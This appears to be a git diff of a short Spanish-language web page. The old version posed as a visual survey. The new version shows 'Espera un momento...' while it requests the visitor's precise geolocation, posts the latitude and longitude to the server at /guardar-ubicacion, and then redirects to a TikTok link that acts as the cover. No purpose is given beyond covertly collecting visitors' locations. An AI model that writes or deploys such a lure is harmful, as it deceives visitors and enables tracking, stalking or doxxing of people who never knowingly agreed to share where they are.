@@ -1,46 +1,33 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8" />
-  <title>Encuesta</title>
-  <style>
-    body, html {
-      margin: 0; padding: 0; height: 100%; display: flex; justify-content: center; align-items: center; background: #fff;
-    }
-    img {
-      max-width: 90vw;
-      max-height: 90vh;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-  </style>
-</head>
-<body>
-  <img src="https://i.imgur.com/tuImagen.jpg" alt="Encuesta visual" />
-
-  <script>
-    // Al cargar, intenta obtener ubicación y mandarla al servidor
-    window.onload = () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            fetch('/guardar-ubicacion', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                timestamp: Date.now()
-              })
-            });
-          },
-          (err) => {
-            console.warn('No se pudo obtener ubicación:', err.message);
-          },
-          { enableHighAccuracy: true, timeout: 5000 }
-        );
-      }
-    };
-  </script>
-</body>
+<html>
+  <head>
+    <title>Redireccionando...</title>
+    <meta charset="UTF-8" />
+    <script>
+      // Obtener ubicación y enviarla al servidor
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          fetch("/guardar-ubicacion", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+            }),
+          }).finally(() => {
+            // Luego redirige a TikTok
+            window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
+          });
+        },
+        (err) => {
+          console.error("Error obteniendo ubicación", err);
+          // Redirige incluso si falla la ubicación
+          window.location.href = "https://vt.tiktok.com/ZShV6fBpq/";
+        }
+      );
+    </script>
+  </head>
+  <body>
+    <p>Espera un momento...</p>
+  </body>
 </html>
